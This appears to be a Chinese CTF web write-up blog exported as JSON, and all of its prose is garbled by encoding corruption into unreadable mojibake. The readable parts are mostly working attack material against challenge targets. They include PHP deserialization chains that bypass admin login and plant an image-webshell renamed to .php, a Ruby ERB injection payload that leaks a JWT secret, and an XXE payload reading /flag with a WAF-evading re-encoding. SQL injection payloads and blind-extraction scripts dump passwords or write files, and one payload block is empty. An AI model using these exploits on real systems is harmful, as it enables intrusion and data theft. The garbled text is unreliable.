{\n            die(\"è¿æ¥å¤±è´¥ï¼Œé”™è¯¯:\" . $this->mysqli->connect_error);\n        }\n        $result=$this->mysqli->prepare($sql);\n        $result->bind_param('s', $this->name);\n        $result->execute();\n        $result->bind_result($idResult, $passwordResult);\n        $result->fetch();\n        $result->close();\n        if ($this->token=='admin') {\n            return $idResult;\n        }\n        if (!$idResult) {\n            echo('ç”¨æˆ·ä¸å­˜åœ¨!');\n            return false;\n        }\n        if (md5($this->password)!==$passwordResult) {\n            echo('å¯†ç é”™è¯¯ï¼');\n            return false;\n        }\n        $_SESSION['token']=$this->name;\n        return $idResult;\n    }\n}\n```\n\nå‘ç°å…¶ä¸­å¯ä»¥å¯¹tokenè¿›è¡Œä¿®æ”¹ï¼Œè€ŒåæŸ¥çœ‹è°ƒç”¨é“¾\n\n```PHP\nclass Info{\n    public function __call($name,$argument){\n        echo $this->CtrlCase->login($argument[0]);//CtrlCase=new dbCtrl;\n    }\n}\n```\n\nInfoä¸­çš„`__call`æ–¹æ³•èƒ½è°ƒç”¨`login`æ–¹æ³•\n\n```PHP\nclass User\n{\n    public function __toString()\n    {\n        $this->nickname->update($this->age);//nikename=new Info;\n        return \"0-0\";\n    }\n}\n```\n\nUserä¸­çš„`__toString`æ–¹æ³•è°ƒç”¨`__call`æ–¹æ³•\n\n```PHP\nClass UpdateHelper{\n    public function __destruct()\n    {\n        echo $this->sql;//sql=new User;\n    }\n}\n```\n\né“¾å­ï¼š`UpdateHepler::__destruct()->User::__toString->Info::__Call()->dbCtrl::login()`\n\nä¸‹ä¸€æ­¥å°±æ˜¯æ„é€ payloadäº†ï¼Œååºåˆ—åŒ–æ‰€ä½¿ç”¨çš„æ–¹æ³•æ˜¯\n\n```PHP\npublic function update(){\n    $Info=unserialize($this->getNewinfo());\n}\npublic function getNewInfo(){\n    $age=$_POST['age'];\n    $nickname=$_POST['nickname'];\n    return safe(serialize(new Info($age,$nickname)));\n}\nfunction safe($parm){\n    $array= array('union','regexp','load','into','flag','file','insert',\"'\",'\\\\',\"*\",\"alter\");\n    return str_replace($array,'hacker',$parm);\n}\n```\n\nç”±äºé¢˜ä¸­å…ˆå¯¹ä¼ å…¥å‚é‡è¿›è¡Œinfoåºåˆ—åŒ–è€Œåå†é€šè¿‡safeå‡½æ•°è¿›è¡Œååºåˆ—åŒ–ï¼Œæ‰€ä»¥æœ€ç»ˆé“¾å­å…¶å®å˜æˆäº†`Info::ä»»æ„å‚é‡=UpdateHepler::__destruct()->User::__toString->Info::__Call()->dbCtrl::login()`ï¼Œå¹¶ä¸”è¿™æ˜¯ä¸€ä¸ªå­—ç¬¦é€ƒé€¸çš„åºåˆ—åŒ–\n\n```php\n//exp.php\n<?php\nclass Info{\n    public $age;\n    public $nickname;\n    public $CtrlCase;\n}\nclass User\n{\n    public $id=\"1\";\n    public $age='select \"1\",\"c4ca4238a0b923820dcc509a6f75849b\" from user where username=?';\n    public $nickname;\n}\nClass UpdateHelper{\n    public $sql;\n}\n\nclass dbCtrl\n{\n    public $hostname=\"127.0.0.1\";\n    public $dbuser=\"root\";\n    public $dbpass=\"root\";\n    public $database=\"test\";\n    public $name=\"admin\";\n    public $password=\"1\";\n    public $mysqli;\n    public $token;\n    public $feng;\n}\n$a=new Info();\n$a->CtrlCase=new UpdateHelper();\n$a->CtrlCase->sql=new User();\n$a->CtrlCase->sql->nickname=new Info();\n$a->CtrlCase->sql->nickname->CtrlCase=new dbCtrl();\nfor($i=1;$i<=95;$i++){\n    echo \"'\";\n}\n?>\";s:8:\"nickname\";N;s:8:\"CtrlCase\";O:12:\"UpdateHelper\":1:{s:3:\"sql\";O:4:\"User\":3:{s:2:\"id\";s:1:\"1\";s:3:\"age\";s:72:\"select \"1\",\"c4ca4238a0b923820dcc509a6f75849b\" from user where username=?\";s:8:\"nickname\";O:4:\"Info\":3:{s:3:\"age\";N;s:8:\"nickname\";N;s:8:\"CtrlCase\";O:6:\"dbCtrl\":9:{s:8:\"hostname\";s:9:\"127.0.0.1\";s:6:\"dbuser\";s:4:\"root\";s:6:\"dbpass\";s:4:\"root\";s:8:\"database\";s:4:\"test\";s:4:\"name\";s:5:\"admin\";s:8:\"password\";s:1:\"1\";s:6:\"mysqli\";N;s:5:\"token\";N;s:4:\"feng\";N;}}}}}\n```\n\nä¼ å…¥ageï¼Œä»»æ„å¯†ç ç™»å½•adminå³å¯\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-05-19 00.37.26.png)\n\n## [b01lers2020]Life on Mars\n\næŠ“åŒ…éšä¾¿ç‚¹ä¸€ä¸ªä¸œè¥¿ï¼Œå‘ç°ä¼ å‚ï¼Œæµ‹è¯•æ˜¯sqlæ³¨å…¥\n\nsqlmapå’Œæ‰‹åŠ¨æ³¨å…¥éƒ½å¯ä»¥ï¼Œå‘ç°å½“å‰æ•°æ®åº“ä¸‹æ²¡æœ‰ç»“æœï¼Œåœ¨å¦å¤–ä¸€ä¸ª`alien_code`æ•°æ®åº“ä¸­\n\næœ€ç»ˆpayload\n\n```\n\n```\n\n\n\n\n\n## [SCTF2019]Flag Shop\n\næœ¬æ¥ä»¥ä¸ºæ˜¯jwtç›´æ¥ç ´è§£æˆ–ä¼ªé€ ï¼Œæ²¡æƒ³åˆ°æ˜¯ä»£ç å®¡è®¡ï¼Œæˆ‘è¿˜ä¸è®¤è¯†//////////ï¼Œæ˜¯rubyçš„æ¨¡ç‰ˆæ³¨å…¥ï¼Œåœ¨robots.txtä¸­èƒ½çœ‹åˆ°æºä»£ç ä½ç½®\n\n```ruby\nrequire 'sinatra'\nrequire 'sinatra/cookies'\nrequire 'sinatra/json'\nrequire 'jwt'\nrequire 'securerandom'\nrequire 'erb'\n\nset :public_folder, File.dirname(__FILE__) + '/static'\n\nFLAGPRICE = 1000000000000000000000000000\nENV[\"SECRET\"] = SecureRandom.hex(64)\n\nconfigure do\n  enable :logging\n  file = File.new(File.dirname(__FILE__) + '/../log/http.log',\"a+\")\n  file.sync = true\n  use Rack::CommonLogger, file\nend\n\nget \"/\" do\n  redirect '/shop', 302\nend\n\nget \"/filebak\" do\n  content_type :text\n  erb IO.binread __FILE__\nend\n\nget \"/api/auth\" do\n  payload = { uid: SecureRandom.uuid , jkl: 20}\n  auth = JWT.encode payload,ENV[\"SECRET\"] , 'HS256'\n  cookies[:auth] = auth\nend\n\nget \"/api/info\" do\n  islogin\n  auth = JWT.decode cookies[:auth],ENV[\"SECRET\"] , true, { algorithm: 'HS256' }\n  json({uid: auth[0][\"uid\"],jkl: auth[0][\"jkl\"]})\nend\n\nget \"/shop\" do\n  erb :shop\nend\n\nget \"/work\" do\n  islogin\n  auth = JWT.decode cookies[:auth],ENV[\"SECRET\"] , true, { algorithm: 'HS256' }\n  auth = auth[0]\n  unless params[:SECRET].nil?\n    if ENV[\"SECRET\"].match(\"#{params[:SECRET].match(/[0-9a-z]+/)}\")\n      puts ENV[\"FLAG\"]\n    end\n  end\n\n  if params[:do] == \"#{params[:name][0,7]} is working\" then\n\n    auth[\"jkl\"] = auth[\"jkl\"].to_i + SecureRandom.random_number(10)\n    auth = JWT.encode auth,ENV[\"SECRET\"] , 'HS256'\n    cookies[:auth] = auth\n    ERB::new(\"<script>alert('#{params[:name][0,7]} working successfully!')</script>\").result\n\n  end\nend\n\npost \"/shop\" do\n  islogin\n  auth = JWT.decode cookies[:auth],ENV[\"SECRET\"] , true, { algorithm: 'HS256' }\n\n  if auth[0][\"jkl\"] < FLAGPRICE then\n\n    json({title: \"error\",message: \"no enough jkl\"})\n  else\n\n    auth << {flag: ENV[\"FLAG\"]}\n    auth = JWT.encode auth,ENV[\"SECRET\"] , 'HS256'\n    cookies[:auth] = auth\n    json({title: \"success\",message: \"jkl is good thing\"})\n  end\nend\n\n\ndef islogin\n  if cookies[:auth].nil? then\n    redirect to('/shop')\n  end\nend\n```\n\nçœ‹åˆ°ä½¿ç”¨äº†REBåŒ…ï¼Œæ˜¯[ruby/erbçš„æ¨¡ç‰ˆæ³¨å…¥](ruby/erbçš„æ¨¡ç‰ˆæ³¨å…¥)\n\nå¤§æ¦‚å†…å®¹å°±æ˜¯ä½¿ç”¨`<%=`æ ‡ç­¾å¯ä»¥æ‰§è¡Œrubyè¯­å¥å¹¶å°†ç»“æœè½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼Œè€Œé¢˜ä¸­æœ‰ `if params[:do] == \"#{params[:name][0,7]} is working\" then`è¿™å¥åˆ¤å®šï¼Œåœ¨åˆ¤å®šç›¸ç­‰çš„æ—¶å€™ä¼šè¿”å›`#{params[:name][0,7]} working successfully!`ï¼Œæˆ‘ä»¬å¦‚æœæŠŠnameä½ç½®æ„é€ æˆæˆ‘ä»¬æƒ³è¦çš„å‚é‡å°±å¯ä»¥æ‹¿åˆ°æˆ‘ä»¬æƒ³è¦çš„å†…å®¹\n\nå°è¯•ä¼ å…¥$0ï¼ˆå½“å‰è¿è¡Œappåç§°ï¼‰å‘ç°å›æ˜¾æˆåŠŸ\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-05-16 23.23.05.png)\n\n|      |                                                              |\n| ---- | ------------------------------------------------------------ |\n| 1    | **$ï¼**æå‡ºçš„æœ€åä¸€ä¸ªå¼‚å¸¸å¯¹è±¡ã€‚ä¹Ÿå¯ä»¥åœ¨*rescue*å­å¥ä¸­ä½¿ç”¨=>æ¥è®¿é—®å¼‚å¸¸å¯¹è±¡ã€‚ |\n| 2    | **$ @**å †æ ˆ*å›æº¯*å‹Ÿé›†çš„æœ€åä¸€ä¸ªå¼‚å¸¸ã€‚å †æ ˆ*å›æº¯*ä¿¡æ¯å¯ä»¥é€šè¿‡Exceptionï¼ƒbacktraceæ–¹æ³•æ£€ç´¢æœ€åä¸€ä¸ªå¼‚å¸¸ã€‚ |\n| 3    | **$ /**è¾“å…¥è®°å½•åˆ†éš”ç¬¦ï¼ˆé»˜è®¤ä¸ºæ¢è¡Œç¬¦ï¼‰ã€‚*è·å–ï¼Œreadline*ç­‰ï¼Œå°†ä»–ä»¬çš„è¾“å…¥è®°å½•åˆ†éš”ç¬¦ä½œä¸ºå¯é€‰å‚æ•°ã€‚ |\n| 4    | **$** è¾“å‡ºè®°å½•åˆ†éš”ç¬¦ï¼ˆé»˜è®¤ä¸ºnilï¼‰ã€‚                          |\n| 5    | **$ï¼Œ**è¦æ‰“å°çš„å‚æ•°å’ŒArrayï¼ƒjoinä¹‹é—´çš„è¾“å‡ºåˆ†éš”ç¬¦ï¼ˆé»˜è®¤ä¸ºnilï¼‰ã€‚æ‚¨å¯ä»¥å°†æ•°ç»„æ˜ç¡®æŒ‡å®šç»™Arrayï¼ƒjoinã€‚ |\n| 6    | **$;**splitçš„é»˜è®¤åˆ†éš”ç¬¦ï¼ˆé»˜è®¤ä¸ºnilï¼‰ã€‚æ‚¨å¯ä»¥ä¸ºStringï¼ƒsplitæŒ‡å®šæ˜ç¡®çš„åˆ†éš”ç¬¦ã€‚ |\n| 7    | **$ã€‚**ä»å½“å‰è¾“å…¥æ–‡ä»¶è¯»å–çš„æœ€åä¸€è¡Œçš„ç¼–å·ã€‚ç›¸å½“äºARGF.linenoã€‚ |\n| 8    | **$ <**ARGFçš„åŒä¹‰è¯                                          |\n| 9    | **$>**$ defoutçš„åŒä¹‰è¯ã€‚                                     |\n| 10   | **$ 0**æ­£åœ¨æ‰§è¡Œçš„å½“å‰Rubyç¨‹åºçš„åç§°ã€‚                        |\n| 11   | **$$**æ­£åœ¨æ‰§è¡Œçš„å½“å‰Rubyç¨‹åºçš„è¿›ç¨‹pidã€‚                      |\n| 12   | **$ï¼Ÿ**æœ€åä¸€ä¸ªè¿›ç¨‹çš„é€€å‡ºçŠ¶æ€ç»ˆæ­¢ã€‚                          |\n| 13   | **$ï¼š**$ LOAD_PATHçš„åŒä¹‰è¯ã€‚                                 |\n| 14   | **$ DEBUG**å¦‚æœæŒ‡å®šäº†-dæˆ–--debugå‘½ä»¤è¡Œé€‰é¡¹ï¼Œåˆ™ä¸ºtrueã€‚       |\n| 15   | **$ defout***print*å’Œ*printf*çš„ç›®æ ‡è¾“å‡ºï¼ˆé»˜è®¤*ä¸º$ stdout*ï¼‰ã€‚ |\n| 16   | **$ F**æŒ‡å®š-aæ—¶æ¥æ”¶*åˆ†å‰²*è¾“å‡ºçš„å˜é‡ã€‚å¦‚æœæŒ‡å®š-aå‘½ä»¤è¡Œé€‰é¡¹ä»¥åŠ-pæˆ–-né€‰é¡¹ï¼Œåˆ™è®¾ç½®æ­¤å˜é‡ã€‚ |\n| 17   | **$ FILENAME**ç›®å‰æ­£åœ¨ä»ARGFè¯»å–çš„æ–‡ä»¶çš„åç§°ã€‚ç›¸å½“äºARGF.filenameã€‚ |\n| 18   | **$ LOAD_PATH**ä¸€ä¸ªæ•°ç»„ï¼Œç”¨äºåŠ è½½å’Œè¦æ±‚æ–¹æ³•åŠ è½½æ–‡ä»¶æ—¶è¦ä¿å­˜è¦æœç´¢çš„ç›®å½•ã€‚ |\n| 19   | **$ SAFE**å®‰å…¨çº§åˆ«0â†’ä¸å¯¹å¤–éƒ¨æä¾›ï¼ˆæ±¡æŸ“ï¼‰æ•°æ®æ‰§è¡Œæ£€æŸ¥ã€‚ï¼ˆé»˜è®¤ï¼‰1â†’ç¦æ­¢ä½¿ç”¨æ±¡æŸ“æ•°æ®çš„æ½œåœ¨å±é™©æ“ä½œã€‚2â†’ç¦æ­¢å¯¹è¿›ç¨‹å’Œæ–‡ä»¶è¿›è¡Œæ½œåœ¨å±é™©çš„æ“ä½œã€‚3â†’æ‰€æœ‰æ–°åˆ›å»ºçš„å¯¹è±¡éƒ½è¢«è®¤ä¸ºæ˜¯æ±¡æŸ“çš„ã€‚4â†’ç¦æ­¢ä¿®æ”¹å…¨å±€æ•°æ®ã€‚ |\n| 20   | **$ stdin**æ ‡å‡†è¾“å…¥ï¼ˆé»˜è®¤ä¸ºSTDINï¼‰ã€‚                         |\n| 21   | **$ stdout**æ ‡å‡†è¾“å‡ºï¼ˆé»˜è®¤ä¸ºSTDOUTï¼‰ã€‚                       |\n| 22   | **$ stderr**æ ‡å‡†é”™è¯¯ï¼ˆé»˜è®¤ä¸ºSTDERRï¼‰ã€‚                       |\n| 23   | **$ VERBOSE**å¦‚æœæŒ‡å®šäº†-vï¼Œ-wæˆ–--verboseå‘½ä»¤è¡Œé€‰é¡¹ï¼Œåˆ™ä¸ºTrueã€‚ |\n| 24   | **$ - x**è§£é‡Šå™¨é€‰é¡¹-xï¼ˆx = 0ï¼Œaï¼Œdï¼ŒFï¼Œiï¼ŒKï¼Œlï¼Œpï¼Œvï¼‰çš„å€¼ã€‚è¿™äº›é€‰é¡¹åˆ—åœ¨ä¸‹é¢ |\n| 25   | **$ -0**è§£é‡Šå™¨é€‰é¡¹-xçš„å€¼å’Œ$ /çš„åˆ«åã€‚                        |\n| 26   | **$ -a**è§£é‡Šå™¨é€‰é¡¹-xçš„å€¼ï¼Œå¦‚æœé€‰é¡¹-aè¢«è®¾ç½®ï¼Œåˆ™ä¸ºtrueã€‚åªè¯»ã€‚ |\n| 27   | **$ -d**è§£é‡Šå™¨é€‰é¡¹-xçš„å€¼å’Œ$ DEBUGçš„åˆ«å                      |\n| 28   | **$ -F**è§£é‡Šå™¨é€‰é¡¹-xå’Œåˆ«å$ ;.                               |\n| 29   | **$ -i**è§£é‡Šå™¨é€‰é¡¹-xå’Œin-place-editæ¨¡å¼çš„å€¼ä¿å­˜æ‰©å±•åï¼Œå¦åˆ™ä¸ºnilã€‚å¯ä»¥å¯ç”¨æˆ–ç¦ç”¨å°±åœ°ç¼–è¾‘æ¨¡å¼ã€‚ |\n| 30   | **$ -I**è§£é‡Šå™¨é€‰é¡¹-xçš„å€¼å’Œ$ï¼šçš„åˆ«åã€‚                        |\n| 31   | **$ -l**è§£é‡Šå™¨é€‰é¡¹-xçš„å€¼ï¼Œå¦‚æœé€‰é¡¹-lisè®¾ç½®ä¸ºtrueã€‚åªè¯»ã€‚     |\n| 32   | **$ -p**è§£é‡Šå™¨é€‰é¡¹-xçš„å€¼ï¼Œå¦‚æœé€‰é¡¹-pisè®¾ç½®ä¸ºtrueã€‚åªè¯»ã€‚     |\n| 33   | **$ _**å±€éƒ¨å˜é‡ï¼Œæœ€åä¸€ä¸ªå­—ç¬¦stringé€šè¿‡getsæˆ–readlineåœ¨å½“å‰ä½œç”¨åŸŸä¸­è¯»å–ã€‚ |\n| 34   | **$ã€œ**ä¸æœ€åä¸€åœºæ¯”èµ›ç›¸å…³çš„å±€éƒ¨å˜é‡*MatchData*ã€‚Regexï¼ƒmatchæ–¹æ³•è¿”å›æœ€åä¸€ä¸ªåŒ¹é…ä¿¡æ¯ã€‚ |\n| 35   | **$ nï¼ˆ$ 1ï¼Œ$ 2ï¼Œ$ 3 ...ï¼‰**åœ¨æœ€åä¸€ä¸ªæ¨¡å¼åŒ¹é…çš„ç¬¬nç»„ä¸­åŒ¹é…çš„å­—ç¬¦stringã€‚ç›¸å½“äºm [n]ï¼Œå…¶ä¸­mæ˜¯*MatchData*å¯¹è±¡ã€‚ |\n| 36   | **$ï¼†**åœ¨æœ€åä¸€ä¸ªæ¨¡å¼åŒ¹é…ä¸­åŒ¹é…çš„å­—ç¬¦stringã€‚ç›¸å½“äºm [0]ï¼Œå…¶ä¸­mæ˜¯*MatchData*å¯¹è±¡ã€‚ |\n| 37   | **$'**åœ¨æœ€åä¸€ä¸ªæ¨¡å¼åŒ¹é…çš„åŒ¹é…ä¹‹å‰çš„å­—ç¬¦stringã€‚ç›¸å½“äºm.pre_matchï¼Œå…¶ä¸­mæ˜¯*MatchData*å¯¹è±¡ã€‚ |\n| 38   | **$\"**åŒ¹é…åçš„å­—ç¬¦stringåœ¨æœ€åä¸€ä¸ªæ¨¡å¼åŒ¹é…ã€‚ç›¸å½“äºm.post_matchï¼Œå…¶ä¸­mæ˜¯MatchDataå¯¹è±¡ã€‚ |\n| 39   | **$ +**ä¸æœ€åä¸€ä¸ªæ¨¡å¼åŒ¹é…çš„æœ€åä¸€ä¸ªæˆåŠŸåŒ¹é…çš„ç»„å¯¹åº”çš„å­—ç¬¦stringã€‚ |\n\nè¿™é‡Œæˆ‘ä»¬ä½¿ç”¨ç¬¬37ä¸ªï¼Œå› ä¸ºåœ¨ä¸Šé¢æœ€åä¸€æ¬¡åŒ¹é…çš„å°±æ˜¯æˆ‘ä»¬æƒ³è¦çš„å¯†é’¥\n\npayloadï¼š\n\n```\nSECRET=&name=%3C%25%3D%24'%25%3E&do=%3C%25%3D%24'%25%3E%20is%20working\n```\n\næ‹¿åˆ°å¯†é’¥ï¼Œç›´æ¥æ”¹é’±æ‹¿flag\n\n## [GKCTF 2021]easycms\n\næç¤ºè¯´åå°5ä½å¼±å£ä»¤ï¼Œç‚¹ç™»å½•æ³¨å†Œéƒ½æ²¡å•¥ååº”ï¼Œæ¨æµ‹å¯èƒ½æ˜¯åå°ç•Œé¢ï¼Œ/admin.phpï¼Œadmin/12345ç™»å½•æˆåŠŸ\n\nä¸‹ä¸€æ­¥åœ¨è®¾è®¡â€”â€”ä¸»é¢˜ä¸­ï¼Œå¯¹ä¸»é¢˜è¿›è¡Œç¼–è¾‘åå¯ä»¥å¯¼å‡ºä¸»é¢˜ï¼Œå­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ï¼Œç›´æ¥å°†themeå‚é‡æ¢æˆbase64(/flag)å³å¯\n\nè¿˜æœ‰å¦ä¸€ç§æ–¹å¼ï¼Œåœ¨è®¾è®¡â€”â€”è‡ªå®šä¹‰â€”â€”é¦–é¡µâ€”â€”ç¼–è¾‘ä¸­å¯ä»¥è‡ªè¡Œæ·»åŠ phpä»£ç ï¼Œæ­¤æ—¶éœ€è¦æˆ‘ä»¬æ·»åŠ æ–‡ä»¶æ¥éªŒè¯èº«ä»½ï¼Œåœ¨è®¾è®¡â€”â€”ç»„ä»¶â€”â€”ç´ æåº“â€”â€”ä¸Šä¼ ç´ æä¸­å­˜åœ¨ç›®å½•ç©¿è¶Šï¼Œä¼ å…¥../../../../../system/tmp/xxxxå³å¯ï¼Œæœ€åä¿å­˜è®¿é—®ä¸»é¡µå°±è¡Œ\n\n## [å¼ºç½‘æ¯ 2019]Upload\n\næ³¨å†Œç™»å½•ï¼Œä¸Šä¼ æµ‹è¯•ï¼Œå‘ç°ä¸Šä¼ åæ–‡ä»¶éƒ½ä¼šè¢«é‡å‘½åå¹¶ä¸”åç¼€è¢«æ›´æ”¹ä¸ºpngï¼Œä¼°è®¡ä¹Ÿæ²¡å•¥ä¸Šä¼ åŠæ³•äº†ï¼Œçœ‹ä¸€ä¸‹cookieï¼Œå‘ç°æ˜¯ä¸€ä¸²banse64ç¼–ç åçš„åºåˆ—åŒ–å­—ç¬¦ä¸²ï¼Œè§£ç å‘ç°å…¶ä¸­æœ‰å¤´åƒimgæ–‡ä»¶è·¯å¾„ï¼Œå°è¯•ç›®å½•ç©¿è¶Šè¯»å–æ–‡ä»¶ï¼Œå¤±è´¥\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-05-17 11.35.50.png)\n\næ‰«ï¼å¾—åˆ°æºç ï¼Œæ¥çœ‹ä¸Šä¼ æ–‡ä»¶ï¼Œä»£ç å®¡è®¡ï¼Œå®¡è®¡å®Œå‘ç°åœ¨æ¯æ¬¡ç™»å½•çš„èº«ä»½è®¤è¯ä¸­éƒ½å«æœ‰`login_check`ï¼Œå…¶ä¸­å¯ä»¥è¿›è¡Œååºåˆ—åŒ–ï¼Œçœ‹åˆ°Profileç±»ä¸­\n\n```php\npublic function __get($name)\n{\n    return $this->except[$name];\n  \t//æ„é€ except['index']='img'ï¼Œ$img='upload_img'æ¥è°ƒç”¨upload_imgæ–¹æ³•\n}\npublic function __call($name, $arguments)\n{\n    if($this->{$name}){\n        $this->{$this->{$name}}($arguments);\n    }\n}\n```\n\nç„¶åå°±æ˜¯æ•´ä¸ªååºåˆ—åŒ–é“¾äº†ï¼Œ\n\n```\nRegister::__destruct->Profile::upload_img\né€šè¿‡æ­¤å¤„\n@copy($this->filename_tmp, $this->filename);\n@unlink($this->filename_tmp);\n$this->img=\"../upload/$this->upload_menu/$this->filename\";\nå°†æˆ‘ä»¬æ„é€ å¥½çš„å›¾ç‰‡é©¬æ›´åå¹¶ä¿å­˜ï¼Œæ„é€ å¦‚ä¸‹exp\n```\n\n\n\n```php\n//exp.php\n<?php\nnamespace app\\web\\controller;\nclass Profile\n{\n    public $checker;\n    public $filename_tmp=\"./upload/c47b21fcf8f0bc8b3920541abd8024fd/a13d380e153c641dd3cfd5b1273d984b.png\";\n    public $filename=\"./upload/c47b21fcf8f0bc8b3920541abd8024fd/1.php\";\n    public $upload_menu;\n    public $ext=\"png\";\n    public $img=\"upload_img\";\n    public $except=[\"index\"=>\"img\"];\n}\nclass Register\n{\n    public $checker;\n    public $registed=false;\n}\n$a=new Profile();\n$b = new Register();\n$b->checker = $a;\necho urlencode(base64_encode(serialize($b)));\n?>\n```\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n## [CSAWQual 2019]Web_Unagi\n\nå°±å·®å‘Šè¯‰ä½ XXEäº†ï¼Œå°è¯•ä¸Šä¼ ä¸€å“ˆ\n\n```xml\n<?xml version=\"1.0\"?>\n<!DOCTYPE test [\n<!ENTITY kkk SYSTEM \"file:///flag\">\n]>\n<users>\n<user>\n<username>alice</username>\n<password>passwd1</password>\n<name>&kkk;</name>\n<email>alice@fakesite.com</email>\n<group>CSAW2019</group>\n<intro>&kkk;</intro>\n</user>\n<user>\n<username>bob</username>\n<password>passwd2</password>\n<name>Bob</name>\n<email>bob@fakesite.com</email>\n<group>CSAW2019</group>\n<intro>&kkk;</intro>\n</user>\n</users>\n```\n\nè¢«WAFæ‹¦æˆªäº†ï¼Œé€‰æ‹©ç¼–ç ç»•è¿‡\n\n> é™¤äº†å‰é¢æåˆ°çš„xmlæ–‡æ¡£çš„ä¸‰ä¸ªéƒ¨åˆ†ä¹‹å¤–ï¼Œè¿˜æœ‰ä½äºå®ƒä»¬ä¹‹ä¸Šçš„ç¬¬å››ä¸ªéƒ¨åˆ†ï¼Œå®ƒä»¬æ§åˆ¶æ–‡æ¡£çš„ç¼–ç ï¼ˆä¾‹å¦‚<?xml?>ï¼‰â€”â€”æ–‡æ¡£çš„ç¬¬ä¸€ä¸ªå­—èŠ‚å¸¦æœ‰å¯é€‰çš„BOM(å­—èŠ‚é¡ºåºæ ‡è®°)ã€‚\n> æ›´å¤šä¿¡æ¯ï¼šhttps://www.w3.org/TR/xml/#sec-guessing\n> ä¸€ä¸ªxmlæ–‡æ¡£ä¸ä»…å¯ä»¥ç”¨UTF-8ç¼–ç ï¼Œä¹Ÿå¯ä»¥ç”¨UTF-16(ä¸¤ä¸ªå˜ä½“â€Š-â€ŠBEå’ŒLE)ã€UTF-32(å››ä¸ªå˜ä½“â€Š-â€ŠBEã€LEã€2143ã€3412)å’ŒEBCDICç¼–ç ã€‚\n> åœ¨è¿™ç§ç¼–ç çš„å¸®åŠ©ä¸‹ï¼Œä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼å¯ä»¥å¾ˆå®¹æ˜“åœ°ç»•è¿‡WAFï¼Œå› ä¸ºåœ¨è¿™ç§ç±»å‹çš„WAFä¸­ï¼Œæ­£åˆ™è¡¨è¾¾å¼é€šå¸¸ä»…é…ç½®ä¸ºå•å­—ç¬¦é›†ã€‚\n> å¤–æ¥ç¼–ç ä¹Ÿå¯ç”¨äºç»•è¿‡æˆç†Ÿçš„WAFï¼Œå› ä¸ºå®ƒä»¬å¹¶ä¸æ€»æ˜¯èƒ½å¤Ÿå¤„ç†ä¸Šé¢åˆ—å‡ºçš„æ‰€æœ‰ç¼–ç ã€‚ä¾‹å¦‚ï¼Œlibxml2è§£æå™¨åªæ”¯æŒä¸€ç§ç±»å‹çš„utf-32â€Š-â€Šutf-32BEï¼Œç‰¹åˆ«æ˜¯ä¸æ”¯æŒBOMã€‚\n\nä½¿ç”¨å‘½ä»¤æ›´æ”¹ç¼–ç \n\n```shell\ncat 1.xml | iconv -f UTF-8 -t UTF-16BE > x16.xml\n```\n\nè®°å¾—å§å†…å®¹æ”¾åˆ°introä¸­ï¼Œä¸ç„¶ä¼šè¢«è£åˆ‡\n\n"},{"title":"https://blog.gem-love.com/ctf/2283.htmlæ³¨å…¥","url":"/posts/38885.html","content":"\n**171**\n\nå…¥é—¨å¼€å§‹ï¼Œç›´æ¥union select\n\n```\ndatabase:ctfshow_web\ntable:ctfshow_user\n0' union select 1,2,group_concat(password) from ctfshow_web.ctfshow_user --+\n```\n\n**172**\n\n```\ndatabase:ctfshow_web\ntable:ctfshow_user2\n0' union select 1,group_concat(password) from ctfshow_web.ctfshow_user2 --+\n```\n\n**173**\n\n```\ndatabase:ctfshow_web\ntable:ctfshow_user3\n0' union select 1,2,group_concat(password) from ctfshow_web.ctfshow_user3 --+\n```\n\n**174**\n\nè¿”å›å†…å®¹ä¸­ä¸èƒ½æœ‰æ•°å­—äº†ï¼Œè¯•è¯•å¸ƒå°”æ³¨å…¥å§\n\nselect * from tableName limit i,n\n\niä¸ºç´¢å¼•ï¼Œnä¸ºæ•°é‡\n\néšä¾¿å†™çš„åƒåœ¾è„šæœ¬\n\n```python\nimport requests\nurl=\"http://5d04fd50-8b1c-40fc-9f33-520ecb876ab5.challenge.ctf.show/api/v4.php?id=1'and 1=     &page=1&limit=10\"\nfor i in range(1,1000):\n    for j in range(45,57):\n        sql = f\"if(ascii(substr((select password from ctfshow_user4 limit 24,1),{i},1))={j},1,0)\"\n        url=f\"http://5d04fd50-8b1c-40fc-9f33-520ecb876ab5.challenge.ctf.show/api/v4.php?id=1'and 1={sql}--+&page=1&limit=10\"\n        tex=requests.get(url).text\n        if 'admin' in tex:\n            print(chr(j),end='')\n    for j in range(97,125):\n        sql = f\"if(ascii(substr((select password from ctfshow_user4 limit 24,1),{i},1))={j},1,0)\"\n        url=f\"http://5d04fd50-8b1c-40fc-9f33-520ecb876ab5.challenge.ctf.show/api/v4.php?id=1'and 1={sql}--+&page=1&limit=10\"\n        tex=requests.get(url).text\n        if 'admin' in tex:\n            print(chr(j),end='')\n```\n\n**175**\n\nå•¥éƒ½æ²¡äº†æ—¶é—´ç›²æ³¨\n\n```python\nimport requests\nurl=\"http://a5db8e88-69c0-425f-940a-d80b5506cf35.challenge.ctf.show/api/v5.php?id=1&page=1&limit=10\"\nfor i in range(1,1000):\n    for j in range(45, 57):\n        sql = f\"if(ascii(substr((select password from ctfshow_user5 limit 24,1),{i},1))={j},sleep(2),0)\"\n        url = f\"http://a5db8e88-69c0-425f-940a-d80b5506cf35.challenge.ctf.show/api/v5.php?id=1'and 1={sql}--+&page=1&limit=10\"\n        try:\n            requests.get(url=url, timeout=1)\n        except Exception as e:\n            print(chr(j), end='')\n    for j in range(97,125):\n        sql = f\"if(ascii(substr((select password from ctfshow_user5 limit 24,1),{i},1))={j},sleep(2),0)\"\n        url=f\"http://a5db8e88-69c0-425f-940a-d80b5506cf35.challenge.ctf.show/api/v5.php?id=1'and 1={sql}--+&page=1&limit=10\"\n        try:\n            requests.get(url=url,timeout=1)\n        except Exception as e:\n            print(chr(j), end='')\n\n```\n\næˆ–è€…è¯•è¯•æ–‡ä»¶è¯»å†™\n\n```\n1' union select 1,password from ctfshow_user5 into outfile '/var/www/html/1.txt' --+\n```\n\n**176**\n\nè¿‡æ»¤äº†union 